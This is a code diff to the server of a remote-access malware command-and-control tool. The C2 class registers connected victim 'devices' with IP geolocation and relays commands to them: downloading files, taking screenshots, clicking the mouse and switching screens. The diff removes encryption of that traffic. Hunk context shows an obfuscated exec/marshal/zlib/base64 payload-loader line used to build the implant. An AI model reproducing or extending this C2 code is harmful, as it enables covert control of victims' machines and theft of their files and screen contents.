@@ -13,15 +13,13 @@ import time
 import geocoder
 import ipaddress
 import threading
-from encryption import encrypt_messages
 
 class C2:
-    def __init__(self, sio, keys):
+    def __init__(self, sio):
         self.sio = sio
         self.devices = {}
         self.total_devices = {}
 
-        self.keys = keys
         self.recovering = []
 
         try:
@@ -100,7 +98,7 @@ class C2:
         return environ.get("HTTP_X_FORWARDED_FOR", "").split(",")[0].strip() or None
 
     def on_connect(self, sid, data):
-        data = json.loads(self.keys.decrypt(data))
+        data = json.loads(data)
         print(f"New device connected with sid {sid}")
 
         environ = self.sio.get_environ(sid)
@@ -178,7 +176,7 @@ class C2:
     def get_result(self, sid, data):
         for device in self.devices:
             if self.devices[device]["sid"] == sid:
-                self.sio.emit("result", {"uid": device, "result": json.loads(self.keys.decrypt(data))})
+                self.sio.emit("result", {"uid": device, "result": data})
                 break
 
     def ctrl(self, data):
@@ -385,7 +383,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             self.sio.emit("download_file", {"uid": uid, "file_path": file_path})
 
     def save_file(self, sid, data):
-        data = json.loads(decrypt(data))
         if not os.path.isdir("files_saved"):
             os.makedirs("files_saved")
 
@@ -417,7 +414,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def screenshot_taken(self, sid, data):
         print(sid)
-        data = json.loads(self.keys.decrypt(data))
         data['image'] = data['image'].encode("latin-1")
         self.sio.emit("screenshot", data)
 
@@ -446,7 +442,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         self.sio.emit("mouse_click_right", data)
 
     def screen_count(self, sid, data):
-        self.sio.emit("screen_count", json.loads(self.keys.decrypt(data)))
+        self.sio.emit("screen_count", data)
 
     def change_screen_number(self, sid, data):
         self.sio.emit("change_screen_number", data)
